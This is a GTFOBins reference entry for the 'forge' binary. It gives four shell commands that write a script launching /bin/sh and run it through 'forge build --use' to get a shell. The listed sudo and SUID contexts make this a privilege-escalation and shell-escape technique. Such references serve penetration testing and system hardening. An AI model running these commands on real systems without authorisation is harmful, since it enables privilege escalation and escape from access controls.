<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/forge -->
---
functions:
  shell:
  - code: |-
      echo '#!/bin/sh' >/path/to/temp-file
      echo -e "/bin/sh <$(tty) >$(tty) 2>$(tty)" >>/path/to/temp-file
      chmod +x /path/to/temp-file
      forge build --use /path/to/temp-file
    contexts:
      sudo:
      suid:
      unprivileged:
...
